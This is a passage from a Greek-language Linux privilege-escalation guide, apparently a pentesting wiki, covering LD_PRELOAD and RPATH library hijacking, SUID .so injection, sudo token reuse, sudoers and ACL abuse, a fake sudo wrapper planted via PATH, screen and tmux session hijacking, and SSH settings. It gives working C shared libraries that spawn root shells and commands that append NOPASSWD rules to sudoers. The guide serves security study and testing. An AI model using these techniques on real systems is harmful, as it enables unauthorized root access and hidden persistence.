```

Αυτή η διαδρομή επίθεσης είναι ιδιαίτερα συνηθισμένη σε wrappers «maintenance»/«backup» που παρέχονται στο `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Η μεταβλητή περιβάλλοντος **LD_PRELOAD** χρησιμοποιείται για να καθορίσει μία ή περισσότερες κοινόχρηστες βιβλιοθήκες (αρχεία .so) που θα φορτωθούν από τον loader πριν από όλες τις άλλες, συμπεριλαμβανομένης της τυπικής βιβλιοθήκης C (`libc.so`). Αυτή η διαδικασία είναι γνωστή ως προφόρτωση βιβλιοθήκης.

Ωστόσο, για τη διατήρηση της ασφάλειας του συστήματος και την αποτροπή εκμετάλλευσης αυτής της δυνατότητας, ιδιαίτερα με εκτελέσιμα **suid/sgid**, το σύστημα επιβάλλει ορισμένες προϋποθέσεις:

- Ο loader αγνοεί το **LD_PRELOAD** για εκτελέσιμα όπου το πραγματικό user ID (_ruid_) δεν αντιστοιχεί στο effective user ID (_euid_).
- Για εκτελέσιμα με suid/sgid, προφορτώνονται μόνο βιβλιοθήκες που βρίσκονται σε τυπικές διαδρομές και έχουν επίσης suid/sgid.

Κλιμάκωση προνομίων μπορεί να συμβεί αν έχετε τη δυνατότητα να εκτελείτε εντολές με `sudo` και η έξοδος της εντολής `sudo -l` περιλαμβάνει τη δήλωση **env_keep+=LD_PRELOAD**. Αυτή η ρύθμιση επιτρέπει στη μεταβλητή περιβάλλοντος **LD_PRELOAD** να διατηρείται και να αναγνωρίζεται ακόμη και όταν εκτελούνται εντολές με `sudo`, οδηγώντας ενδεχομένως στην εκτέλεση αυθαίρετου κώδικα με αυξημένα προνόμια.<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

Αποθήκευση ως **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Στη συνέχεια, **κάντε compile** χρησιμοποιώντας:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Τέλος, **κλιμακώστε τα προνόμια** εκτελώντας

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> Ένα παρόμοιο privesc μπορεί να αξιοποιηθεί αν ο attacker ελέγχει τη μεταβλητή περιβάλλοντος **LD_LIBRARY_PATH**, επειδή ελέγχει τη διαδρομή στην οποία θα αναζητηθούν οι libraries.

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### SUID Δυαδικό – .so injection

Όταν συναντάτε ένα binary με δικαιώματα **SUID** που φαίνεται ασυνήθιστο, είναι καλή πρακτική να επαληθεύσετε αν φορτώνει σωστά αρχεία **.so**. Αυτό μπορεί να ελεγχθεί εκτελώντας την ακόλουθη εντολή:<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

Για παράδειγμα, η εμφάνιση ενός σφάλματος όπως _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ υποδηλώνει πιθανότητα exploit.

Για να γίνει exploit, θα δημιουργούσε κανείς ένα αρχείο C, ας πούμε _"/path/to/.config/libcalc.c"_, που θα περιέχει τον ακόλουθο κώδικα:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Αυτός ο κώδικας, μόλις μεταγλωττιστεί και εκτελεστεί, αποσκοπεί στην κλιμάκωση προνομίων μέσω της τροποποίησης των δικαιωμάτων αρχείων και της εκτέλεσης ενός shell με αυξημένα προνόμια.

Μεταγλωττίστε το παραπάνω αρχείο C σε shared object (.so) με:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

Τέλος, η εκτέλεση του επηρεασμένου SUID binary θα πρέπει να ενεργοποιήσει το exploit, επιτρέποντας πιθανή παραβίαση του συστήματος.

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Τώρα που εντοπίσαμε ένα δυαδικό αρχείο SUID που φορτώνει μια βιβλιοθήκη από έναν φάκελο στον οποίο μπορούμε να γράψουμε, ας δημιουργήσουμε τη βιβλιοθήκη σε αυτόν τον φάκελο με το απαραίτητο όνομα:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Αν εμφανιστεί σφάλμα όπως

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

αυτό σημαίνει ότι η βιβλιοθήκη που δημιουργήσατε πρέπει να έχει μια συνάρτηση με όνομα `a_function_name`.

### GTFOBins

Το [**GTFOBins**](https://gtfobins.github.io) είναι μια επιμελημένη λίστα με Unix binaries που μπορεί να εκμεταλλευτεί ένας attacker για να παρακάμψει τοπικούς περιορισμούς ασφαλείας. Το [**GTFOArgs**](https://gtfoargs.github.io/) είναι το αντίστοιχο για περιπτώσεις όπου μπορείτε να **εισάγετε μόνο arguments** σε μια εντολή.

Το project συγκεντρώνει νόμιμες λειτουργίες Unix binaries που μπορούν να χρησιμοποιηθούν για να ξεφύγετε από restricted shells, να κλιμακώσετε ή να διατηρήσετε αυξημένα privileges, να μεταφέρετε αρχεία, να δημιουργήσετε bind και reverse shells και να διευκολύνετε άλλες εργασίες post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Αν έχετε πρόσβαση στο `sudo -l`, μπορείτε να χρησιμοποιήσετε το εργαλείο [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) για να ελέγξετε αν εντοπίζει τρόπο εκμετάλλευσης κάποιου κανόνα sudo.

### Επαναχρησιμοποίηση Sudo Tokens

Σε περιπτώσεις όπου έχετε **πρόσβαση sudo**, αλλά όχι τον κωδικό πρόσβασης, μπορείτε να κλιμακώσετε τα privileges **περιμένοντας να εκτελεστεί μια εντολή sudo και στη συνέχεια υποκλέπτοντας το session token**.<sup>[[18]](#references)</sup>

Προϋποθέσεις για την κλιμάκωση των privileges:

- Έχετε ήδη ένα shell ως χρήστης "_sampleuser_"
- Ο χρήστης "_sampleuser_" έχει **χρησιμοποιήσει το `sudo`** για να εκτελέσει κάτι τα **τελευταία 15 λεπτά** (από προεπιλογή, αυτή είναι η διάρκεια του sudo token που μας επιτρέπει να χρησιμοποιούμε το `sudo` χωρίς να εισάγουμε κωδικό πρόσβασης)
- Η τιμή του `cat /proc/sys/kernel/yama/ptrace_scope` είναι 0
- Το `gdb` είναι διαθέσιμο (θα πρέπει να μπορείτε να το ανεβάσετε)

(Μπορείτε να ενεργοποιήσετε προσωρινά το `ptrace_scope` με `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ή να το τροποποιήσετε μόνιμα αλλάζοντας το `/etc/sysctl.d/10-ptrace.conf` και ορίζοντας `kernel.yama.ptrace_scope = 0`)

Αν πληρούνται όλες αυτές οι προϋποθέσεις, **μπορείτε να κλιμακώσετε τα privileges χρησιμοποιώντας:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Το **πρώτο exploit** (`exploit.sh`) θα δημιουργήσει το binary `activate_sudo_token` στο _/tmp_. Μπορείτε να το χρησιμοποιήσετε για να **ενεργοποιήσετε το sudo token στο session σας** (δεν θα αποκτήσετε αυτόματα root shell· εκτελέστε `sudo su`):

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- Το **δεύτερο exploit** (`exploit_v2.sh`) θα δημιουργήσει ένα sh shell στο _/tmp_, **με ιδιοκτήτη τον root και ενεργοποιημένο το setuid**

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- Το **third exploit** (`exploit_v3.sh`) θα **δημιουργήσει ένα αρχείο sudoers** που κάνει τα **sudo tokens αιώνια και επιτρέπει σε όλους τους χρήστες να χρησιμοποιούν το sudo**

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

Αν έχετε **δικαιώματα εγγραφής** στον φάκελο ή σε οποιοδήποτε από τα αρχεία που έχουν δημιουργηθεί μέσα σε αυτόν, μπορείτε να χρησιμοποιήσετε το binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) για να **δημιουργήσετε ένα sudo token για έναν χρήστη και ένα PID**.\
Για παράδειγμα, αν μπορείτε να αντικαταστήσετε το αρχείο _/var/run/sudo/ts/sampleuser_ και έχετε ένα shell ως αυτός ο χρήστης με PID 1234, μπορείτε να **αποκτήσετε δικαιώματα sudo** χωρίς να χρειάζεται να γνωρίζετε τον κωδικό πρόσβασης, κάνοντας:

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

Το αρχείο `/etc/sudoers` και τα αρχεία μέσα στο `/etc/sudoers.d` ρυθμίζουν ποιος μπορεί να χρησιμοποιεί το `sudo` και με ποιον τρόπο. Αυτά τα αρχεία **είναι από προεπιλογή αναγνώσιμα μόνο από τον χρήστη root και την ομάδα root**.\
**Αν** μπορείτε να **διαβάσετε** αυτό το αρχείο, ίσως μπορέσετε να **αποκτήσετε κάποιες ενδιαφέρουσες πληροφορίες**, ενώ αν μπορείτε να **γράψετε** σε οποιοδήποτε αρχείο, θα μπορέσετε να **κλιμακώσετε τα προνόμιά σας**.

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

Αν έχεις δικαίωμα εγγραφής, μπορείς να το καταχραστείς.

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

Ένας άλλος τρόπος να καταχραστείτε αυτά τα δικαιώματα:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

Υπάρχουν ορισμένες εναλλακτικές για το δυαδικό αρχείο `sudo`, όπως το `doas` για το OpenBSD. Θυμηθείτε να ελέγξετε τη διαμόρφωσή του στο `/etc/doas.conf`

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

Αν το `doas` επιτρέπει έναν editor ή interpreter, ελέγξτε για escapes τύπου GTFOBins:

```bash
doas vim
:!/bin/sh
```

A root-capable `doas` rule για το αρχικό `dstat` που βασίζεται σε Python αξίζει επίσης έλεγχο της διαδρομής των plugins. Το [manual](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) και ο [source code](https://github.com/dstat-real/dstat/blob/master/dstat) αναφέρουν τις `/usr/share/dstat/` και `/usr/local/share/dstat/` μεταξύ των τοποθεσιών για plugins `dstat_*.py`. Αν ο τρέχων χρήστης μπορεί να γράψει και να αναζητήσει σε μια τοποθεσία που πράγματι χρησιμοποιεί το εγκατεστημένο build, ένα επιλεγμένο plugin μπορεί να εκτελεστεί με την ταυτότητα RunAs του `doas`. Επιβεβαιώστε τον ενεργό κανόνα, την αναζήτηση plugins σε αυτό το build, τα δικαιώματα ή τα ACL του καταλόγου και των γονικών καταλόγων, καθώς και το αν ο καλών μπορεί να επιλέξει plugin· ένας κανόνας `dstat` ή ένας εγγράψιμος κατάλογος από μόνος του αποτελεί μόνο ένδειξη. Άλλες υλοποιήσεις του `dstat` μπορεί να χρησιμοποιούν διαφορετικά συστήματα plugins. Επιθεωρήστε τα metadata παθητικά, χωρίς να φορτώσετε plugin.

### Sudo Hijacking

Αν γνωρίζετε ότι ένας **χρήστης συνδέεται συνήθως σε ένα μηχάνημα και χρησιμοποιεί το `sudo`** για να κλιμακώσει τα προνόμιά του και έχετε αποκτήσει shell στο πλαίσιο αυτού του χρήστη, μπορείτε να **δημιουργήσετε ένα νέο εκτελέσιμο `sudo`** που θα εκτελεί τον κώδικά σας ως root και, στη συνέχεια, την εντολή του χρήστη. Έπειτα, **τροποποιήστε το $PATH** του πλαισίου του χρήστη (για παράδειγμα, προσθέτοντας τη νέα διαδρομή στο .bash_profile), ώστε όταν ο χρήστης εκτελεί το `sudo`, να εκτελείται το δικό σας εκτελέσιμο `sudo`.

Σημειώστε ότι αν ο χρήστης χρησιμοποιεί διαφορετικό shell (όχι bash), θα χρειαστεί να τροποποιήσετε άλλα αρχεία για να προσθέσετε τη νέα διαδρομή. Για παράδειγμα, το [sudo-piggyback](https://github.com/APTy/sudo-piggyback) τροποποιεί τα `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Μπορείτε να βρείτε ένα άλλο παράδειγμα στο [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ή εκτελώντας κάτι σαν:

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## Κοινόχρηστη βιβλιοθήκη

### ld.so

Το αρχείο `/etc/ld.so.conf` υποδεικνύει **από πού προέρχονται τα αρχεία ρυθμίσεων που φορτώνονται**. Συνήθως, αυτό το αρχείο περιέχει την ακόλουθη διαδρομή: `include /etc/ld.so.conf.d/*.conf`

Αυτό σημαίνει ότι θα διαβαστούν τα αρχεία ρυθμίσεων από το `/etc/ld.so.conf.d/*.conf`. Αυτά τα αρχεία ρυθμίσεων **υποδεικνύουν άλλους φακέλους** στους οποίους θα **αναζητηθούν** οι **βιβλιοθήκες**. Για παράδειγμα, το περιεχόμενο του `/etc/ld.so.conf.d/libc.conf` είναι `/usr/local/lib`. **Αυτό σημαίνει ότι το σύστημα θα αναζητήσει βιβλιοθήκες μέσα στο `/usr/local/lib`**.

Αν για κάποιον λόγο **ένας χρήστης έχει δικαιώματα εγγραφής** σε οποιαδήποτε από τις διαδρομές που υποδεικνύονται — `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, οποιοδήποτε αρχείο μέσα στο `/etc/ld.so.conf.d/` ή οποιονδήποτε φάκελο που περιλαμβάνεται σε αρχείο ρυθμίσεων μέσα στο `/etc/ld.so.conf.d/*.conf` — ενδέχεται να μπορέσει να κλιμακώσει τα προνόμιά του.\
Δείτε **πώς να εκμεταλλευτείτε αυτήν την εσφαλμένη ρύθμιση** στην ακόλουθη σελίδα:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

Αντιγράφοντας τη lib στο `/var/tmp/flag15/`, το πρόγραμμα θα τη χρησιμοποιήσει από αυτήν τη θέση, όπως ορίζεται στη μεταβλητή `RPATH`.

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

Στη συνέχεια, δημιουργήστε μια κακόβουλη βιβλιοθήκη στο /var/tmp με την εντολή gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Δυνατότητες

Οι δυνατότητες Linux παρέχουν σε μια διεργασία ένα **υποσύνολο των διαθέσιμων δικαιωμάτων root**. Αυτό ουσιαστικά διασπά τα δικαιώματα **σε μικρότερες και διακριτές μονάδες**. Κάθε μία από αυτές τις μονάδες μπορεί στη συνέχεια να εκχωρηθεί ανεξάρτητα σε διεργασίες. Με αυτόν τον τρόπο, το πλήρες σύνολο δικαιωμάτων περιορίζεται, μειώνοντας τους κινδύνους εκμετάλλευσης.\
Διαβάστε την παρακάτω σελίδα για να **μάθετε περισσότερα σχετικά με τις δυνατότητες και πώς να τις καταχραστείτε**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Δικαιώματα καταλόγων

Σε έναν κατάλογο, το **bit για "execute"** σημαίνει ότι ο επηρεαζόμενος χρήστης μπορεί να κάνει "**cd**" στον φάκελο.\
Το bit **"read"** σημαίνει ότι ο χρήστης μπορεί να **εμφανίσει** τα **αρχεία**, ενώ το bit **"write"** σημαίνει ότι μπορεί να **διαγράψει** και να **δημιουργήσει** νέα **αρχεία**.

## ACLs

Οι Λίστες Ελέγχου Πρόσβασης (ACLs) αποτελούν το δευτερεύον επίπεδο διακριτών δικαιωμάτων και μπορούν να **παρακάμπτουν τα παραδοσιακά δικαιώματα ugo/rwx**. Αυτά τα δικαιώματα ενισχύουν τον έλεγχο της πρόσβασης σε αρχεία ή καταλόγους, επιτρέποντας ή αρνούμενα δικαιώματα σε συγκεκριμένους χρήστες που δεν είναι κάτοχοι ή μέλη της ομάδας. Αυτό το επίπεδο **λεπτομερούς ελέγχου εξασφαλίζει ακριβέστερη διαχείριση πρόσβασης**. Περισσότερες λεπτομέρειες μπορείτε να βρείτε [**εδώ**](https://linuxconfig.org/how-to-manage-acls-on-linux).<sup>[[19]](#references)</sup>

**Δώστε** στον χρήστη "kali" δικαιώματα ανάγνωσης και εγγραφής σε ένα αρχείο:

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**Λάβετε αρχεία με συγκεκριμένα ACL από το σύστημα:**

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### Κρυφό backdoor ACL σε drop-ins του sudoers

Μια συνηθισμένη εσφαλμένη ρύθμιση είναι ένα αρχείο με ιδιοκτήτη το root στο `/etc/sudoers.d/`, με mode `440`, το οποίο εξακολουθεί να παρέχει δικαίωμα εγγραφής σε έναν χρήστη με χαμηλά προνόμια μέσω ACL.

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

Αν δείτε κάτι σαν `user:alice:rw-`, ο χρήστης μπορεί να προσθέσει έναν κανόνα sudo παρά τα περιοριστικά bits δικαιωμάτων:

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

Αυτή είναι μια διαδρομή persistence/privesc υψηλού αντίκτυπου μέσω ACL, επειδή είναι εύκολο να μην την εντοπίσει κανείς σε ελέγχους που βασίζονται μόνο στο `ls -l`.

## Ανοιχτές συνεδρίες shell

Η πρόσβαση μεταξύ χρηστών στο GNU Screen εξαρτάται από τη διαμόρφωση και το ACL της **εκτελούμενης συνεδρίας**, όχι μόνο από την έκδοσή του. [GNU Screen documents](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html) ότι πρέπει να έχει γίνει build με υποστήριξη multiuser· οι ρυθμίσεις `multiuser on` και `acladd` ή μια κατάλληλη παραχώρηση μέσω `aclchg` επιτρέπουν σε άλλον χρήστη να συνδεθεί. [The manual also requires setuid-root](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html) για την αναζήτηση συνεδριών μεταξύ χρηστών. Ένα ορατό socket που ανήκει στον root ή ένα SUID εκτελέσιμο `screen` από μόνο του δεν αποδεικνύει ότι υπάρχει shell root στο οποίο μπορεί να συνδεθεί κάποιος. Πριν το θεωρήσετε κλιμάκωση, επιβεβαιώστε ότι η ενεργή συνεδρία είναι multiuser, ότι ο τρέχων χρήστης έχει αποτελεσματικά δικαιώματα εισαγωγής εντολών και ότι το shell της συνεδρίας εκτελείται ως ο προνομιούχος κάτοχός της.

### Παραβίαση συνεδριών screen

**Λίστα συνεδριών screen**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![Παραβίαση συνεδριών screen - Τοποθεσίες socket (ορισμένα συστήματα εμφανίζουν το ένα ως συμβολικό σύνδεσμο του άλλου): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Σύνδεση σε μια συνεδρία**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## tmux sessions hijacking

Αυτό ήταν πρόβλημα σε **παλιές εκδόσεις του tmux**. Δεν μπόρεσα να κάνω hijack σε μια συνεδρία tmux (v2.1) που δημιουργήθηκε από τον root ως μη προνομιούχος χρήστης.

**Λίστα συνεδριών tmux**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Τοποθεσίες socket (ορισμένα συστήματα εμφανίζουν το ένα ως symlink του άλλου) - tmux sessions hijacking: tmux -S /tmp/dev sess ls Εκτελέστε την εντολή χρησιμοποιώντας αυτό το socket· μπορείτε να ξεκινήσετε μια συνεδρία tmux σε αυτό το socket...](<../../images/image (837).png>)

**Σύνδεση σε μια συνεδρία**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

Ελέγξτε το **Valentine box από το HTB** για ένα παράδειγμα.

## SSH

### Προβλέψιμο PRNG του Debian OpenSSL - CVE-2008-0166

Τα κλειδιά που δημιουργήθηκαν με επηρεαζόμενες εκδόσεις του OpenSSL στο Debian ή σε παράγωγες διανομές κατά την ιστορική περίοδο ευπάθειας ενδέχεται να έχουν προβλέψιμη τυχαιότητα· η τρέχουσα διανομή του host ή η ενημερωμένη έκδοση του OpenSSL δεν αποδεικνύει πώς δημιουργήθηκε ένα παλαιότερο κλειδί. Ελέγξτε το **συγκεκριμένο κλειδί** με κατάλληλη ιστορική blacklist και εξετάστε την προέλευσή του. Το εγχειρίδιο [`ssh-vulnkey` του Debian](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) περιγράφει τον έλεγχο δημόσιων κλειδιών και του `authorized_keys`, ενώ το [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) καταγράφει τη διόρθωση του OpenSSL. Μια καταχώριση στο `authorized_keys` ενός λογαριασμού με αυξημένα δικαιώματα αποτελεί ένδειξη για πιθανή κλιμάκωση δικαιωμάτων μόνο αν μπορεί να ανακτηθεί το αντίστοιχο ιδιωτικό κλειδί και η ενεργή πολιτική SSH εξακολουθεί να το αποδέχεται για αυτόν τον λογαριασμό· ένα αδύναμο **κλειδί host** δεν αποτελεί από μόνο του διαπιστευτήριο σύνδεσης. Αντικαταστήστε τα παραβιασμένα κλειδιά και αφαιρέστε τις παλιές εξουσιοδοτήσεις τους.

### Ενδιαφέρουσες τιμές διαμόρφωσης SSH

- **PasswordAuthentication:** Καθορίζει αν επιτρέπεται η ταυτοποίηση με κωδικό πρόσβασης. Η προεπιλογή του OpenSSH upstream είναι `yes`· η διαμόρφωση της διανομής μπορεί να την παρακάμψει.
- **PubkeyAuthentication:** Καθορίζει αν επιτρέπεται η ταυτοποίηση με δημόσιο κλειδί. Η προεπιλογή είναι `yes`.
- **PermitEmptyPasswords**: Όταν επιτρέπεται η ταυτοποίηση με κωδικό πρόσβασης, καθορίζει αν ο server επιτρέπει τη σύνδεση σε λογαριασμούς με κενό κωδικό πρόσβασης. Η προεπιλογή είναι `no`.

### Αρχεία ελέγχου σύνδεσης

Τα παρακάτω αρχεία επηρεάζουν το ποιος μπορεί να συνδεθεί και με ποιον τρόπο:

- **`/etc/nologin`**: αν υπάρχει, αποκλείει τις συνδέσεις χρηστών εκτός του root και εμφανίζει το μήνυμά του.
- **`/etc/securetty`**: περιορίζει από πού μπορεί να συνδεθεί ο root (allowlist TTY).
- **`/etc/motd`**: banner μετά τη σύνδεση (μπορεί να προκαλέσει leak πληροφοριών για το περιβάλλον ή τις εργασίες συντήρησης).

### PermitRootLogin

Καθορίζει αν ο root μπορεί να συνδεθεί μέσω ssh. Η προεπιλογή του OpenSSH upstream είναι `prohibit-password`· η διαμόρφωση της διανομής μπορεί να την παρακάμψει. Πιθανές τιμές:

- `yes`: ο root μπορεί να συνδεθεί με κωδικό πρόσβασης ή ιδιωτικό κλειδί
- `without-password` ή `prohibit-password`: ο root μπορεί να συνδεθεί μόνο με ιδιωτικό κλειδί
- `forced-commands-only`: ο root μπορεί να συνδεθεί μόνο με ιδιωτικό κλειδί και εφόσον έχουν καθοριστεί οι επιλογές commands
- `no` : όχι

### Έμπιστες αρχές έκδοσης πιστοποιητικών χρηστών SSH

Το `TrustedUserCAKeys` ορίζει τα δημόσια κλειδιά που εμπιστεύεται το sshd για την υπογραφή πιστοποιητικών **χρηστών**. Αν το αντίστοιχο ιδιωτικό κλειδί CA είναι αναγνώσιμο από χρήστη με λιγότερα δικαιώματα, εξετάστε ποιος μπορεί να λάβει πιστοποιητικό και για ποιους λογαριασμούς θα μπορούσε να χρησιμοποιηθεί για ταυτοποίηση. Τα `AuthorizedPrincipalsFile` ή `AuthorizedPrincipalsCommand` μπορούν να περιορίσουν τα αποδεκτά ονόματα· αν δεν έχει διαμορφωθεί κανένα από τα δύο, το πιστοποιητικό πρέπει να περιέχει το όνομα του λογαριασμού-στόχου. Το `PermitRootLogin prohibit-password` αποκλείει την ταυτοποίηση του root με κωδικό πρόσβασης, αλλά μπορεί να επιτρέπει την ταυτοποίηση με πιστοποιητικό. Η έκθεση μιας διαδρομής κλειδιού από μόνη της δεν αποδεικνύει ότι υπάρχει πρόσβαση: επιβεβαιώστε το ζεύγος δημόσιου/ιδιωτικού κλειδιού, τους ενεργούς κανόνες `Match`, την πολιτική λογαριασμού, τη φράση πρόσβασης του κλειδιού, την ανάκληση και τους αποδεκτούς αλγορίθμους υπογραφής. Μην συμπεριλάβετε ιδιωτικά bytes κλειδιού στην έξοδο απαρίθμησης. Δείτε το [εγχειρίδιο διαμόρφωσης του server OpenSSH](https://man.openbsd.org/sshd_config#TrustedUserCAKeys).

Ένα ιδιωτικό κλειδί CA μπορεί επίσης να είναι αξιοποιήσιμο **χωρίς να είναι αναγνώσιμο** από τον τρέχοντα χρήστη, αν ένας κανόνας ανάθεσης προνομίων επιτρέπει στον χρήστη να εκτελέσει έναν μη περιορισμένο [signer πιστοποιητικών, όπως το `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s), με την ταυτότητα του κατόχου του κλειδιού. Συσχετίστε την ακριβή επιτρεπόμενη εντολή και τα ορίσματά της με την πρόσβαση του λογαριασμού signer στο κλειδί, τη δημόσια CA που εμπιστεύεται η ενεργή διαμόρφωση του sshd, το principal που γίνεται αποδεκτό για τον λογαριασμό-στόχο, την ισχύ του πιστοποιητικού και την πολιτική σύνδεσης του συγκεκριμένου λογαριασμού. Μια εντολή delegated signer ή ένα αρχείο έμπιστης CA από μόνα τους δεν αποδεικνύουν πρόσβαση σε άλλον λογαριασμό· μην υπογράφετε δοκιμαστικό πιστοποιητικό κατά την παθητική απαρίθμηση.

### AuthorizedKeysFile

Καθορίζει τα αρχεία που περιέχουν τα δημόσια κλειδιά τα οποία μπορούν να χρησιμοποιηθούν για την ταυτοποίηση χρηστών. Μπορεί να περιέχει tokens όπως το `%h`, το οποίο αντικαθίσταται από τον αρχικό κατάλογο του χρήστη. **Μπορείτε να ορίσετε απόλυτες διαδρομές** (που ξεκινούν με `/`) ή **σχετικές διαδρομές από τον αρχικό κατάλογο του χρήστη**. Για παράδειγμα:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

Αυτή η ρύθμιση υποδεικνύει ότι, αν προσπαθήσετε να συνδεθείτε με το **private** key του χρήστη "**testusername**", το ssh θα συγκρίνει το public key σας με αυτά που βρίσκονται στα `/home/testusername/.ssh/authorized_keys` και `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

